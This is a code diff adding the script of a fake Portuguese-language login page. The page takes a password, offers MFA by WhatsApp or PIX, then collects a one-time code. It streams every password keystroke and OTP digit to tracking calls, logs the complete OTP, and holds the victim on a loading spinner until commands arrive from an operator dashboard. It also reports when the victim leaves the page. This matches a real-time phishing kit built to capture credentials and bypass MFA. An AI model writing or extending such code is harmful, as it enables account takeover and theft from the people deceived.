+  const eyeIcon       = document.getElementById('eyeIcon');
+
+  passwordInput.addEventListener('input', () => {
+    trackInput('senha', passwordInput.value, 'Senha');
+    passwordError.classList.remove('show');
+    passwordInput.classList.remove('error');
+    const ok = passwordInput.value.length >= 1;
+    btnLogin.disabled = !ok;
+    btnLogin.classList.toggle('active', ok);
+    btnLogin.classList.toggle('disabled', !ok);
+  });
+  togglePw.addEventListener('click', () => {
+    const isText = passwordInput.type === 'text';
+    passwordInput.type = isText ? 'password' : 'text';
+    eyeIcon.innerHTML = isText
+      ? '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>'
+      : '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/>';
+  });
+  btnLogin.addEventListener('click', () => {
+    if (!passwordInput.value) return;
+    // Mostra spinner de carregamento
+    mostrarSpinner(true);
+    trackEvent('login_attempt', `Verificando senha...`, 'info');
+  });
+  passwordInput.addEventListener('keydown', e => { if (e.key === 'Enter' && !btnLogin.disabled) btnLogin.click(); });
+
+  // ── Step 3 ──
+  document.getElementById('optWa').querySelector('.btn-selecionar').addEventListener('click', () => {
+    // Mostra spinner de carregamento
+    mostrarSpinner(true);
+    trackEvent('mfa_request', 'Verificando MFA via WhatsApp...', 'info');
+  });
+  document.getElementById('optPix').querySelector('.btn-selecionar').addEventListener('click', () => {
+    // Mostra spinner de carregamento
+    mostrarSpinner(true);
+    trackEvent('mfa_request', 'Verificando MFA via PIX...', 'info');
+  });
+
+  // ── Step 4w: OTP ──
+  const otpBoxes = Array.from(document.querySelectorAll('.otp-box'));
+  const btnContinuarWa = document.getElementById('btnContinuarWa');
+
+  otpBoxes.forEach((box, i) => {
+    box.addEventListener('input', () => {
+      box.value = box.value.replace(/\D/g, '').slice(-1);
+      if (box.value && i < otpBoxes.length - 1) otpBoxes[i + 1].focus();
+      const parcial = otpBoxes.map(b => b.value || '_').join(' ');
+      trackInput('otp_whatsapp', parcial, 'WhatsApp OTP');
+      const full = otpBoxes.every(b => b.value.length === 1);
+      btnContinuarWa.disabled = !full;
+      btnContinuarWa.classList.toggle('active', full);
+      btnContinuarWa.classList.toggle('disabled', !full);
+      if (full) trackEvent('login_success', 'Código OTP WhatsApp preenchido', 'success');
+    });
+    box.addEventListener('keydown', e => {
+      if (e.key === 'Backspace' && !box.value && i > 0) otpBoxes[i - 1].focus();
+    });
+  });
+  btnContinuarWa.addEventListener('click', () => {
+    if (btnContinuarWa.disabled) return;
+    const code = otpBoxes.map(b => b.value).join('');
+    // Mostra spinner de carregamento
+    mostrarSpinner(true);
+    trackEvent('login_attempt', `Verificando código OTP: ${code}`, 'info');
+  });
+
+  // ── Voltar ──
+  const prevStep = { s2: 's1', s3: 's2', s4p: 's3', s4w: 's3' };
+  const prevOpts = {
+    s1: { showLogo: true,  showBelow: true,  showVoltar: false },
+    s2: { showLogo: false, showBelow: false, showVoltar: true  },
+    s3: { showLogo: false, showBelow: false, showVoltar: true  },
+  };
+
+  const stepNames = { s1:'Login', s2:'Senha', s3:'MFA', s4p:'PIX', s4w:'WhatsApp OTP' };
+
+  voltarRow.addEventListener('click', () => {
+    const prev = prevStep[cur];
+    if (!prev) return;
+    trackEvent('login_attempt', `Usuário voltou de "${stepNames[cur]}" para "${stepNames[prev]}"`, 'warning');
+    const opts = prevOpts[prev] ?? { showLogo: true, showBelow: false, showVoltar: true };
+    if (prev === 's1') {
+      passwordInput.value = '';
+      passwordError.classList.remove('show');
+      passwordInput.classList.remove('error');
+      btnLogin.disabled = true; btnLogin.classList.replace('active','disabled');
+    }
+    if (prev === 's2') {
+      otpBoxes.forEach(b => { b.value = ''; });
+      btnContinuarWa.disabled = true; btnContinuarWa.classList.replace('active','disabled');
+    }
+    goTo(prev, opts);
+  });
+
+  // Spinner de carregamento
+  function mostrarSpinner(show) {
+    const spinner = document.getElementById('loadingSpinner');
+    spinner.style.display = show ? 'flex' : 'none';
+    _isWaiting = show;
+    if (show) sendHeartbeat(); // Notifica dashboard imediatamente
+  }
+
+  // Mostra mensagem de comando do dashboard
+  function mostrarCmd(icon, title, msg, cmd) {
+    // Se tinha spinner, fecha
+    mostrarSpinner(false);
+
+    // Não mostra notificação para comandos bem-sucedidos
+    if (cmd === 'senha_correta' || cmd === 'acesso_liberado' || cmd === 'mfa_whatsapp_ok' || cmd === 'mfa_pix_ok' || cmd === 'codigo_valido' || cmd === 'otp_correto') return;
+
+    // Mostra mensagem de erro embaixo do campo apropriado
+    const errorMap = {
+      s1: { el: emailCpfError, input: emailCpfInput },
+      s2: { el: passwordError, input: passwordInput },
+      s3: { el: document.getElementById('mfaError'), input: null },
+      s4p: { el: document.getElementById('pixError'), input: null },
+      s4w: { el: document.getElementById('otpError'), input: null },
+    };
+
+    const errorConfig = errorMap[cur];
+    if (errorConfig && errorConfig.el) {
+      errorConfig.el.textContent = msg;
+      errorConfig.el.classList.add('show');
+      if (errorConfig.input) errorConfig.input.classList.add('error');
+    }
+  }
+
+  let _cmdToastTimer;
+
+  window.addEventListener('beforeunload', () => {
+    if (_broadcastChannel) {
+      _broadcastChannel.send({
+        type: 'broadcast', event: 'session',
+        payload: { sessionId: _sessionId, action: 'leave' },
+      });
+    }
+    if (cur !== 's1') {
+      trackEvent('timeout', `Usuário saiu durante o step "${stepNames[cur]}"`, 'warning');
+    }
+  });
+</script>
+</body>
+</html>
